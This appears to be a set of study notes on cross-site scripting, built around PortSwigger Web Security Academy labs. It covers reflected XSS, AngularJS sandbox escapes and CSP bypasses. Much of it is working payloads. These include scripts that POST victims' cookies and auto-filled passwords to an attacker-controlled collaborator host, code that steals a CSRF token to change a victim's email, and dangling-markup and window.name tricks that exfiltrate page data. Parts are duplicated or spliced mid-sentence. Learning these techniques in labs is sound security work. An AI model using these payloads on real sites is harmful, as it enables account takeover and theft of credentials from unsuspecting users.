                              ## What is cross-site scripting (XSS)?
# Cross-site scripting (also known as XSS) is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application.
# From version 92 onward (July 20th, 2021), cross-origin iframes are prevented from calling alert(). As these are used to construct some of the more advanced XSS attacks, you'll sometimes need to use an alternative PoC payload. In this scenario, we recommend the print() function.

                            ## What are the types of XSS attacks?
   
    1. ## Reflected XSS, where the malicious script comes from the current HTTP request.
    2. ## Stored XSS, where the malicious script comes from the website's database.
    3. ## DOM-based XSS, where the vulnerability exists in client-side code rather than server-side code.
    
                       ## Reflected cross-site scripting                         
Reflected XSS is the simplest variety of cross-site scripting.It arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way. 

EXAMPLE:
           https://insecure-website.com/status?message=All+is+well.
           <p>Status: All is well.</p>
 
 The application doesn't perform any other processing of the data, so an attacker can easily construct an attack like this: 
         https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>
         <p>Status: <script>/* Bad stuff here... */</script></p>
         
If the user visits the URL constructed by the attacker, then the attacker's script executes in the user's browser, in the context of that user's session with the application. At that point, the script can carry out any action, and retrieve any data, to which the user has access. 

                                     ## 2. Stealing Cookies using xss
 ## 2.1 Exploiting cross-site scripting to steal cookies    
 ------->
   1. The victim might not be logged in.
   2.  Many applications hide their cookies from JavaScript using the HttpOnly flag.
   3. Sessions might be locked to additional factors like the user's IP address.
   4.  The session might time out before you're able to hijack it.

    
    alert(document.domain)
    
                                        <script>
                                    fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
                                    method: 'POST',
                                    mode: 'no-cors',
                                    body:document.cookie
                                    });
                                    </script>

scripting using burp collaborator: 




                           
                                                   ## Exploiting cross-site scripting to capture passwords
 # These days, many users have password managers that auto-fill their passwords.
 # You can take advantage of this by creating a password input, reading out the auto-filled password, and sending it to your own domain.
 # This technique avoids most of the problems associated with stealing cookies, and can even gain access to every other account where the victim has reused the same password. 
 
 # The primary disadvantage of this technique is that it only works on users who have a password manager that performs password auto-fill. (Of course, if a user doesn't have a password saved you can still attempt to obtain their password through an on-site phishing attack, but it's not quite the same.) 
 
 
                           <input name=username id=username>
                          <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
                          method:'POST',
                          mode: 'no-cors',
                          body:username.value+':'+this.value
                          });">
                          
                          
                                                 ## Exploiting cross-site scripting to perform CSRF
                                                 
 # Anything a legitimate user can do on a web site, you can probably do too with XSS. Depending on the site you're targeting, you might be able to make a victim send a message, accept a friend request, commit a backdoor to a source code repository, or transfer some Bitcoin. 

# Some websites allow logged-in users to change their email address without re-entering their password. If you've found an XSS vulnerability, you can make it trigger this functionality to change the victim's email address to one that you control, and then trigger a password reset to gain access to the account. 

# This type of exploit is typically referred to as cross-site request forgery (CSRF), which is slightly confusing because CSRF can also occur as a standalone vulnerability. When CSRF occurs as a standalone vulnerability, it can be patched using strategies like anti-CSRF tokens. However, these strategies do not provide any protection if an XSS vulnerability is also present


                          <script>
                          var req = new XMLHttpRequest();
                          req.onload = handleResponse;
                          req.open('get','/my-account',true);
                          req.send();
                          function handleResponse() {
                              var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
                              var changeReq = new XMLHttpRequest();
                              changeReq.open('post', '/my-account/change-email', true);
                              changeReq.send('csrf='+token+'&email=test@test.com')
                          };
                          </script>

                          This will make anyone who views the comment issue a POST request to change their email address to test@test.com. 
                          
                          
                          
                                <SOURCE-CODE>
                        <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
                            <label>Email</label>
                            <input required type="email" name="email" value="">
                            <input required type="hidden" name="csrf" value="UVQTBTZWsVWuXuFh3vVVzfWBhJG5VbuI">
                            <button class='button' type='submit'> Update email </button>
                        </form>    
                        
  If you view the source for the page, you'll see the following information:

   >> You need to issue a POST request to /my-account/change-email, with a parameter called email.
   >> There's an anti-CSRF token in a hidden input called token.
   
   This means your exploit will need to load the user account page, extract the CSRF token, and then use the token to change the victim's email address. 
   
   
                             <script>
                          var req = new XMLHttpRequest();
                          req.onload = handleResponse;
                          req.open('get','/my-account',true);
                          req.send();
                          function handleResponse() {
                              var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
                              var changeReq = new XMLHttpRequest();
                              changeReq.open('post', '/my-account/change-email', true);
                              changeReq.send('csrf='+token+'&email=test@test.com')
                          };
                          </script>

                          This will make anyone who views the comment issue a POST request to change their email address to test@test.com
                          
                          
                          ## Reflected XSS in different contexts
#  There are many different varieties of reflected cross-site scripting. The location of the reflected data within the application's response determines what type of payload is required to exploit it and might also affect the impact of the vulnerability.

# In addition, if the application performs any validation or other processing on the submitted data before it is reflected, this will generally affect what kind of XSS payload is needed.                           


# When testing for reflected and stored XSS, a key task is to identify the XSS context:

   >> The location within the response where attacker-controllable data appears.
   >> Any input validation or other processing that is being performed on that data by the application.
                          
                          # XSS between HTML tags
Some useful ways of executing JavaScript are: 
  <script>alert(document.domain)</script>
  <img src=1 onerror=alert(1)>

                        
                        
                              ## REFLECTIVE XSS INTO HTML WITH MOST TAG BLOCKED
STEP1: In Burp Intruder, in the Positions tab, click "Clear §". Replace the value of the search term with: <> 
STEP2: Place the cursor between the angle brackets and click "Add §" twice, to create a payload position. The value of the search term should now look like: <§§>
STEP3: Visit the XSS cheat sheet and click "Copy tags to clipboard". 
STEP4: Go back to the Positions tab in Burp Intruder and replace your search term with: <body%20=1>
STEP5: Place the cursor before the = character and click "Add §" twice, to create a payload position. The value of the search term should now look like: <body%20§§=1>

# <iframe src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=alert(document.cookie)%3E" onload=this.style.width='100px'>

                       
                       ## REFLECTIVE XSS WHERE ALL THE TAGS ARE BLOCKED
# <script>
  location = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
  </script>                           
                        


                   ## Reflected XSS with event handlers and href attributes blocked
                   
# This lab contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchor href attributes are blocked.. 
# To solve the lab, perform a cross-site scripting attack that injects a vector that, when clicked, calls the alert function. 
#  Note that you need to label your vector with the word "Click" in order to induce the simulated lab user to click your vector. For example:
<a href="">Click me</a>

# https://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
                          
EXAMPLE: 
STEP1: When the attack is finished, review the results. Observe that all payloads caused an HTTP 400 response, except for the ones using the <svg>, <animatetransform>, <title>, and <image> tags, which received a 200 response. 
STEP2: Go back to the Positions tab in Burp Intruder and replace your search term with: <svg><animatetransform%20=1>
STEP3: Place the cursor before the = character and click "Add §" twice to create a payload position. The value of the search term should now be: <svg><animatetransform%20§§=1>
STEP4: Visit the following URL in the browser to confirm that the alert() function is called and the lab is solved: 

https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E

                           

                              ## XSS in HTML tag attributes

# When the XSS context is into an HTML tag attribute value, you might sometimes be able to terminate the attribute value, close the tag, and introduce a new one. For example: 

--------> "><script>alert(document.domain)</script>

# More commonly in this situation, angle brackets are blocked or encoded, so your input cannot break out of the tag in which it appears. 

#  Provided you can terminate the attribute value, you can normally introduce a new attribute that creates a scriptable context, such as an event handler. For example: 

----------> " autofocus onfocus=alert(document.domain) x=" 

# The above payload creates an onfocus event that will execute JavaScript when the element receives the focus, and also adds the autofocus attribute to try to trigger the onfocus event automatically without any user interaction. Finally, it adds x=" to gracefully repair the following markup. 

Example #1:

# This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded
Payload: "onmouseover="alert(1)

Example #2:

# Sometimes the XSS context is into a type of HTML tag attribute that itself can create a scriptable context. Here, you can execute JavaScript without needing to terminate the attribute value.
Payload:
STEP1: Post a comment with a random alphanumeric string in the "Website" input, then use Burp Suite to intercept the request and send it to Burp Repeater. 
STEP2: Make a second request in the browser to view the post and use Burp Suite to intercept the request and send it to Burp Repeater. 
STEP3: Observe that the random string in the second Repeater tab has been reflected inside an anchor href attribute. 

<a href="javascript:alert(document.domain)"> OR website=javascript:alert(document.domain)




                              ## Reflected XSS in canonical link tag
 # You might encounter websites that encode angle brackets but still allow you to inject attributes.
 # Sometimes, these injections are possible even within tags that don't usually fire events automatically, such as a canonical tag.
 # You can exploit this behavior using access keys and user interaction on Chrome.
 # Access keys allow you to provide keyboard shortcuts that reference a specific element.
 # The accesskey attribute allows you to define a letter that, when pressed in combination with other keys (these vary across different platforms), will cause events to fire.
 
                             
Example: 
# This lab reflects user input in a canonical link tag and escapes angle brackets. 
# To solve the lab, perform a cross-site scripting attack on the home page that injects an attribute that calls the alert function. 
#  Visit the following URL, replacing YOUR-LAB-ID with your lab ID: 
---> https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)

# This sets the X key as an access key for the whole page. When a user presses the access key, the alert function is called. 

# To trigger the exploit on yourself, press one of the following key combinations:

    On Windows: ALT+SHIFT+X
    On MacOS: CTRL+ALT+X
    On Linux: Alt+X


                                                  
                                                  ## XSS in hidden input fields

# <input type="hidden" name="redacted" value="default" injection="xss" />
# XSS in hidden inputs is frequently very difficult to exploit because typical JavaScript events like onmouseover and onfocus can't be triggered due to the element being invisible.

# I decided to investigate further to see if it was possible to exploit this on a modern browser. I tried a bunch of stuff like autofocus, CSS tricks and other stuff.
# Eventually I thought about access keys and wondered if the onclick event would be called on the hidden input when it activated via an access key. 
# It most certainly does on Firefox! This means we can execute an XSS payload inside a hidden attribute, provided you can persuade the victim into pressing the key combination.
# On Firefox Windows/Linux the key combination is ALT+SHIFT+X and on OS X it is CTRL+ALT+X. You can specify a different key combination using a different key in the access key attribute. Here is the vector:

----> <input type="hidden" accesskey="X" onclick="alert(1)">

# Please note if your reflection is repeated then the key combination will fail.
# A workaround is to then inject another attribute that breaks the second reflection. e.g. " accesskey="x" onclick="alert(1)" x='
# Update - Now works on Chrome and link/meta and any other elements
# This technique now works in Chrome! It also works in link elements that means previously unexploitable XSS bugs in link elements where you only control attributes can be exploited using this technique.
# For example you might have a link element with a rel attribute on canonical, if you inject the accesskey attribute with an onclick event then you have XSS. 

                      <link rel="canonical" accesskey="X" onclick="alert(1)" />



                                                    ## XSS into JavaScript
   ## Terminating the existing script
# In the simplest case, it is possible to simply close the script tag that is enclosing the existing JavaScript, and introduce some new HTML tags that will trigger execution of JavaScript. For example, if the XSS context is as follows: 

                                                <script>
                                                ...
                                                var input = 'controllable data here';
                                                ...
                                                </script>
                                                    
 
 #  then you can use the following payload to break out of the existing JavaScript and execute your own: 
 
 ----> </script><img src=1 onerror=alert(document.domain)>
 
# The reason this works is that the browser first performs HTML parsing to identify the page elements including blocks of script, and only later performs JavaScript parsing to understand and execute the embedded scripts.
# The above payload leaves the original script broken, with an unterminated string literal. But that doesn't prevent the subsequent script being parsed and executed in the normal way. 


                                      
                                                          ## Breaking out of a JavaScript string
                                                          
#  In cases where the XSS context is inside a quoted string literal, it is often possible to break out of the string and execute JavaScript directly. 
#  It is essential to repair the script following the XSS context, because any syntax errors there will prevent the whole script from executing.

#  Some useful ways of breaking out of a string literal are: 

                                                  '-alert(document.domain)-'
                                                  ';alert(document.domain)//
                                                  '-alert(1)-'
                                                  
# Some applications attempt to prevent input from breaking out of the JavaScript string by escaping any single quote characters with a backslash.
# A backslash before a character tells the JavaScript parser that the character should be interpreted literally, and not as a special character such as a string terminator.
# In this situation, applications often make the mistake of failing to escape the backslash character itself.
# This means that an attacker can use their own backslash character to neutralize the backslash that is added by the application.

<> For example, suppose that the input: 
---> ';alert(document.domain)//

<> gets converted to: 
---> \';alert(document.domain)//

<>  You can now use the alternative payload: 
----> \';alert(document.domain)//

<> which gets converted to: 
----> \\';alert(document.domain)//

# Here, the first backslash means that the second backslash is interpreted literally, and not as a special character. 
# This means that the quote is now interpreted as a string terminator, and so the attack succeeds. 

# Some websites make XSS more difficult by restricting which characters you are allowed to use. 
# This can be on the website level or by deploying a WAF that prevents your requests from ever reaching the website.
# In these situations, you need to experiment with other ways of calling functions which bypass these security measures. 
# One way of doing this is to use the throw statement with an exception handler.
# This enables you to pass arguments to a function without using parentheses.
# The following code assigns the alert() function to the global exception handler and the throw statement passes the 1 to the exception handler (in this case alert).
# The end result is that the alert() function is called with 1 as an argument.

Payload: onerror=alert;throw 1



                                                  ## XSS without parentheses and semi-colons
# A few years ago I discovered a technique to call functions in JavaScript without parentheses using onerror and the throw statement.
# It works by setting the onerror handler to the function you want to call and the throw statement is used to pass the argument to the function: 

Payload: <script>onerror=alert;throw 1337</script>

# The onerror handler is called every time a JavaScript exception is created, and the throw statement allows you to create a custom exception containing an expression which is sent to the onerror handler.
# Because throw is a statement, you usually need to follow the onerror assignment with a semi-colon in order to begin a new statement and not form an expression. 

# I encountered a site that was filtering parentheses and semi-colons, and I thought it must be possible to adapt this technique to execute a function without a semi-colon.
# The first way is pretty straightforward: you can use curly braces to form a block statement in which you have your onerror assignment.
# After the block statement you can use throw without a semi-colon (or new line):

Payload: <script>{onerror=alert}throw 1337</script>

# The block statement was good but I wanted a cooler alternative.
# Interestingly, because the throw statement accepts an expression, you can do the onerror assignment inside the throw statement and because the last part of the expression is sent to the onerror handler the function will be called with the chosen arguments.

Payload: <script>throw onerror=alert,'some string',123,'haha'</script>

# If you've tried running the code you'll notice that Chrome prefixes the string sent to the exception handler with "Uncaught".
# In my previous blog post I showed how it was possible to use eval as the exception handler and evaluate strings.

# To recap you can prefix your string with an = which then makes the 'Uncaught' string a variable and executes arbitrary JavaScript

For example: <script>{onerror=eval}throw'=alert\x281337\x29'</script>

# The string sent to eval is "Uncaught=alert(1337)". 
# This works fine on Chrome but on Firefox the exception gets prefixed with a two word string "uncaught exception" which of course causes a syntax error when evaluated. I started to look for ways around this. 

<> It's worth noting that the onerror/throw trick won't work when executing a throw from the console.
<> This is because when the throw statement is executed in the console the result is sent to the console and not the exception handler.

# When you use the Error function in Firefox to create an exception it does not contain the "uncaught exception" prefix. But instead, just the string "Error":

Payload: throw new Error("My message")//Error: My message

# I obviously couldn't call the Error function because it requires parentheses but I thought maybe if I use an object literal with the Error prototype that would emulate the behaviour. 
# This didn't work - Firefox still prefixed it with the same string. 
# I then used the Hackability Inspector to inspect the Error object to see what properties it had.
# I added all the properties to the object literal and it worked! One by one I removed a property to find the minimal set of properties required:

Payload: <script>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'}</script>

# You can use the fileName property to send a second argument on Firefox too:

Payload: <script>{onerror=prompt}throw{lineNumber:1,columnNumber:1,fileName:'second argument',message:'first argument'}</script>

Second Payload: <script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>

Third Payload: <script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>

Payload: https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27


                                                    ## Making use of HTML-encoding
# When the XSS context is some existing JavaScript within a quoted tag attribute, such as an event handler, it is possible to make use of HTML-encoding to work around some input filters. 
# When the browser has parsed out the HTML tags and attributes within a response, it will perform HTML-decoding of tag attribute values before they are processed any further.
# If the server-side application blocks or sanitizes certain characters that are needed for a successful XSS exploit, you can often bypass the input validation by HTML-encoding those characters. 

For example, if the XSS context is as follows: 

<a href="#" onclick="... var input='controllable data here'; ...">

and the application blocks or escapes single quote characters, you can use the following payload to break out of the JavaScript string and execute your own script: 

&apos;-alert(document.domain)-&apos;

# The &apos; sequence is an HTML entity representing an apostrophe or single quote.
# Because the browser HTML-decodes the value of the onclick attribute before the JavaScript is interpreted, the entities are decoded as quotes, which become string delimiters, and so the attack succeeds. 

Payload: http://foo?&apos;-alert(1)-&apos;


                              
                                                        ## XSS in JavaScript template literals
                                                        
# JavaScript template literals are string literals that allow embedded JavaScript expressions.
# The embedded expressions are evaluated and are normally concatenated into the surrounding text.
# Template literals are encapsulated in backticks instead of normal quotation marks, and embedded expressions are identified using the ${...} syntax. 

 For example, the following script will print a welcome message that includes the user's display name: 
 ------> document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;
 
# 

# When the XSS context is into a JavaScript template literal, there is no need to terminate the literal.
# Instead, you simply need to use the ${...} syntax to embed a JavaScript expression that will be executed when the literal is processed. For example, if the XSS context is as follows: 

                  <script>
                  ...
                  var input = `controllable data here`;
                  ...
                  </script>

#  then you can use the following payload to execute JavaScript without terminating the template literal: 

${alert(document.domain)}

LAB:  Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
Payload: ${alert(1)}



                                                    ## Client-side template injection
                                                    
# We'll describe how you can craft exploits that escape from the AngularJS sandbox, and how you can potentially use AngularJS features to bypass content security policy (CSP).

# Naive use of the extremely popular JavaScript framework AngularJS is exposing numerous websites to Angular Template Injection.
# This relatively low profile sibling of server-side template injection can be combined with an Angular sandbox escape to launch cross-site scripting (XSS) attacks on otherwise secure sites.




                                                                ## What is client-side template injection?
                                                                
# Client-side template injection vulnerabilities arise when applications using a client-side template framework dynamically embed user input in web page
# When rendering a page, the framework scans it for template expressions and executes any that it encounters.
# An attacker can exploit this by supplying a malicious template expression that launches a cross-site scripting (XSS) attack. 

                                          
                                                                 ## What is the AngularJS sandbox?
                                                                 
# The AngularJS sandbox is a mechanism that prevents access to potentially dangerous objects, such as window or document, in AngularJS template expressions.
# It also prevents access to potentially dangerous properties, such as __proto__
# Although bypassing the sandbox was initially challenging, security researchers have discovered numerous ways of doing so.
# As a result, it was eventually removed from AngularJS in version 1.6.
# However, many legacy applications still use older versions of AngularJS and may be vulnerable as a result. 

                                            
                                                      ## How does the AngularJS sandbox work?
                                                      
 # The sandbox works by parsing an expression, rewriting the JavaScript, and then using various functions to test whether the rewritten code contains any dangerous objects.
 # For example, the ensureSafeObject() function checks whether a given object references itself.
 # The ensureSafeMemberName() function checks each property access of the object and, if it contains dangerous properties such as __proto__ or __lookupGetter__, the object will be blocked.
 # The ensureSafeFunction()function prevents call(), apply(), bind(), or constructor() from being called. 
 
                                                      

                                                    ## How does an AngularJS sandbox escape work?
                                                    
# A sandbox escape involves tricking the sandbox into thinking the malicious expression is benign.
# The most well-known escape uses the modified charAt() function globally within an expression: 

Payload: 'a'.constructor.prototype.charAt=[].join

# When it was initially discovered, AngularJS did not prevent this modification.
# The attack works by overwriting the function using the [].join method, which causes the charAt() function to return all the characters sent to it, rather than a specific single character.
# Due to the logic of the isIdent() function in AngularJS, it compares what it thinks is a single character against multiple characters.
# As single characters are always less than multiple characters, the isIdent() function always returns true, as demonstrated by the following example: 


                                isIdent = function(ch) {
                                    return ('a' <= ch && ch <= 'z' || 'A' <= ch && ch <= 'Z' || '_' === ch || ch === '$');
                                }
                                isIdent('x9=9a9l9e9r9t9(919)')

# Once the isIdent() function is fooled, you can inject malicious JavaScript.
# For example, an expression such as $eval('x=alert(1)') would be allowed because AngularJS treats every character as an identifier. 
# Note that we need to use AngularJS's $eval() function because overwriting the charAt() function will only take effect once the sandboxed code is executed.
# This technique would then bypass the sandbox and allow arbitrary JavaScript execution.

# Angular expressions can't do much harm on their own, but when combined with a sandbox escape we can execute arbitrary JavaScript and do some serious damage.

# The first page dynamically embeds user input, but is not vulnerable to XSS because it uses htmlspecialchars to HTML encode the input:

                            <html>
                            <body>
                            <p>
                            <?php
                            $q = $_GET['q'];
                            echo htmlspecialchars($q,ENT_QUOTES);
                            ?>
                            </p>
                            </body>
                            </html>
                            
# The second page is almost identical, but the Angular import means it can be exploited by injecting an Angular expression, and with a sandbox escape we can get XSS.

                          <html ng-app>
                          <head>
                          <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.4.7/angular.js"></script>
                          </head>
                          <body>
                          <p>
                          <?php
                          $q = $_GET['q'];
                          echo htmlspecialchars($q,ENT_QUOTES);?>
                          </p>   
                          </body>
                          </html>
                          
# Note that you need to have "ng-app" above the expression in the DOM tree. Usually an Angular site will use it in the root HTML or body tag.                          
                          
                          
                          
                                                    ## Corrupting the sanitizer
# The Angular sanitizer is a client side filter written in JavaScript that extends Angular to safely allow HTML bindings using attributes called ng-bind-html that contain a reference you want to filter.
# It then takes the input and renders it in an invisible DOM tree and applies white list filtering to the elements and attributes.

Payload: {{ 'a'.constructor.fromCharCode=[].join; 
            'a'.constructor[0]='\u003ciframe onload=alert(/Backdoored/)\u003e';
          }}


Payload:

            {{
                'a'.constructor.prototype.charCodeAt=[].concat
            }}
            </div>
            <script>
            onload=function(){
              alert('abc'.charCodeAt(0));
            }
            </script>
                  

                                    ## Escaping the sandbox
                                    
<> Here's the final payload, tailored to Angular 1.4:

        {{
        'a'.constructor.prototype.charAt=[].join;
        eval('x=1} } };alert(1)//');
        }}
        
        AND
        
        Angular 1.6
        
        {{constructor.constructor('alert(1)')()}}

Site: https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs  // Contain Some pretty list of sandbox bypass


                                                ## Constructing an advanced AngularJS sandbox escape
                                                
# So you've learned how a basic sandbox escape works, but you may encounter sites that are more restrictive with which characters they allow. 
# For example, a site may prevent you from using double or single quotes.
# n this situation, you need to use functions such as String.fromCharCode() to generate your characters.

# In a standard sandbox escape, you would use $eval() to execute your JavaScript payload, but in the lab below, the $eval() function is undefined. 
# Fortunately, we can use the orderBy filter instead. The typical syntax of an orderBy filter is as follows: 

Payload: [123]|orderBy:'Some string'

# Note that the | operator has a different meaning than in JavaScript. Normally, this is a bitwise OR operation, but in AngularJS it indicates a filter operation.
# In the code above, we are sending the array [123] on the left to the orderBy filter on the right.
# The colon signifies an argument to send to the filter, which in this case is a string.
# The orderBy filter is normally used to sort an object, but it also accepts an expression, which means we can use it to pass a payload.

Lab: Reflected XSS with AngularJS sandbox escape without strings
Payload: https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1



                                                ## How does an AngularJS CSP bypass work?
# Content security policy (CSP) bypas<input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1],alert)'">

#  Notice that the from() function is used, which allows you to convert an object to an array and call a given function (specified in the second argument) on every element of that array. 
# ses work in a similar way to standard sandbox escapes, but usually involve some HTML injection
# When the CSP mode is active in AngularJS, it parses template expressions differently and avoids using the Function constructor.
# This means the standard sandbox escape described above will no longer work.
# Depending on the specific policy, the CSP will block JavaScript events. However, AngularJS defines its own events that can be used instead.

# When inside an event, AngularJS defines a special $event object, which simply references the browser event object
# You can use this object to perform a CSP bypass.
# On Chrome, there is a special property on the $event/event object called path.
# This property contains an array of objects that causes the event to be executed.
# The last property is always the window object, which we can use to perform a sandbox escape.
# By passing this array to the orderBy filter, we can enumerate the array and use the last element (the window object) to execute a global function, such as alert(). 
# The following code demonstrates this: 

Payload: <input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1],alert)'">

# Notice that the from() function is used, which allows you to convert an object to an array and call a given function (specified in the second argument) on every element of that array. 
# In this case, we are calling the alert() function. 
# We cannot call the function directly because the AngularJS sandbox would parse the code and detect that the window object is being used to call a function.
# Using the from() function instead effectively hides the window object from the sandbox, allowing us to inject malicious code. 

Payload: <input id=x ng-focus=$event.path|orderBy:'CSS&&[1].map(alert)'> 

# The pipe character in AngularJS signifies a filter operation so the path array is sent to the orderBy filter and this accepts an expression. 
# I then use the CSS property to detect when the array element is currently using the last element which is window.
# Then I use the map function to execute the alert function because the sandbox will detect window if calling alert as a normal function call. 

# I challenged the audience to reduce it further and Erlend Oftedal managed to do it by replacing the CSS property with "x" which is the ID of the injected input element.
# This works because "x" will be a global property of window and thus can be used to detect the window object.

Payload: <input id=x ng-focus=$event.path|orderBy:'x&&[1].map(alert)'> 

Reduced Payloads:
1. <input id=x ng-focus=$event.path|orderBy:'x&&[alert].pop()(1)'>
2. <input id=x ng-focus=$event.path|orderBy:'[alert].pop()(1)'>
3. <input id=x ng-focus=$event.path|orderBy:'[alert][0](1)'>
4. <input id=x ng-focus=$event.path|orderBy:'(y=alert)(1)'>



LAB: Reflected XSS with AngularJS sandbox escape and CSP

Payload: 

<script>
location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>




                                                        ## Content security policy
                                                        
# Content security policy (CSP) is a browser mechanism that aims to mitigate the impact of cross-site scripting and some other vulnerabilities
# If an application that employs CSP contains XSS-like behavior, then the CSP might hinder or prevent exploitation of the vulnerability.
# Often, the CSP can be circumvented to enable exploitation of the underlying vulnerability. 

                                                      ## What is CSP (content security policy)?
                                                      
# CSP is a browser security mechanism that aims to mitigate XSS and some other attacks. It works by restricting the resources (such as scripts and images) that a page can load and restricting whether a page can be framed by other pages. 
# To enable CSP, a response needs to include an HTTP response header called Content-Security-Policy with a value containing the policy.
# The policy itself consists of one or more directives, separated by semicolons.

                                                  
                                                      ## Mitigating XSS attacks using CSP
                                                      
# The following directive will only allow scripts to be loaded from the same origin as the page itself: 
---> script-src 'self'

#  The following directive will only allow scripts to be loaded from a specific domain: 
----> script-src https://scripts.normal-website.com

# Some browsers, such as Chrome, have built-in dangling markup mitigation that will block requests containing certain characters, such as raw, unencoded new lines or angle brackets. 


                                                  ## Evading CSP with DOM-based dangling markup
                                                  
# Dangling markup is a technique to steal the contents of the page without script by using resources such as images to send the data to a remote location that an attacker controls.
# It is useful when reflected XSS doesn't work or is blocked by Content Security Policy (CSP). 
# The idea is you inject some partial HTML that is in an unfinished state such as a src attribute of an image tag, and the rest of the markup on the page closes the attribute but also sends the data in-between to the remote server. 
# For example let's say we have an injection point above a script and a form like this:

                        INJECTION HERE <b>test</b>
                        <script>
                        token = 'supersecret';
                        </script>
                        <form action="blah"></form>
                        
# If we inject an image tag with an open src attribute like so:

                        <img src="https://evilserver/?
                        
# The code between the injection point and the next double quote will be then sent to the remote server.
# This might include something sensitive like a CSRF token.
# Here's what it looks like with the injection. I've highlighted what is sent to the server:

                    <img src="https://evilserver/?<b>test</b>
                    <script>
                    token = 'supersecret';
                    </script>
                    <form action="blah"></form>
                    
# Bypassing a restrictive CSP with base target

# CSP allows a developer to block external resources from being loaded to prevent this sort of attack.
# However, I've found a new technique that will work even with a really restrictive CSP such as:

Payload: default-src 'none'; base-uri 'none';

# The above CSP will block the image vector with the open src attribute because the policy will not load any image resources or other sub resources.
# However we can use a base tag to bypass this restriction

Payload: <a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html><font size=100 color=red>You must click me</font></a><base target="blah


Lab: Reflected XSS protected by very strict CSP, with dangling markup attack

Payload: 

<script>
if(window.name) {
	new Image().src='//BURP-COLLABORATOR-SUBDOMAIN?'+encodeURIComponent(window.name);
	} else {
		location = 'https://YOUR-LAB-ID.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
}
</script>

















                        
                        
                        
                        
                        
                        
                        
                        
                        


                          
                          
                          
                          
















                                                  
                                                  
                                                  
                                                  
                                                  
                                                  









                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
